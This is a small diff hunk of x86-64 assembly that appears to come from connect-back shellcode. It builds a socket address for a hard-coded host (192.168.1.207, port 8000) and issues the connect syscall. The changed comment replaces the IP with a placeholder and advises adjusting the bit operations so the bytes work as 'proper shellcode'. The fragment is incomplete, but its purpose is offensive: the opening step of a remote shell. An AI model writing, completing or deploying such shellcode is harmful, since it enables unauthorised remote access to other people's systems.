@@ -25,7 +25,7 @@ xor rdx, rdx ;xor last argument
 
 pop rdi ;pop it
 
-mov rbx, 0xCF01A8C0401F0002 ; push 192.168.1.207 8000 AF_INET NEED TO FIX THIS
+mov rbx, 0xCF01A8C0401F0002 ; push <IP> 8000 AF_INET YOU MAY NEED TO MAKE BIT OPERATIONS HERE IN ORDER TO MAKE THIS PROPER SHELLCODE
 push rbx
 
 mov al, 42 ;connect syscall
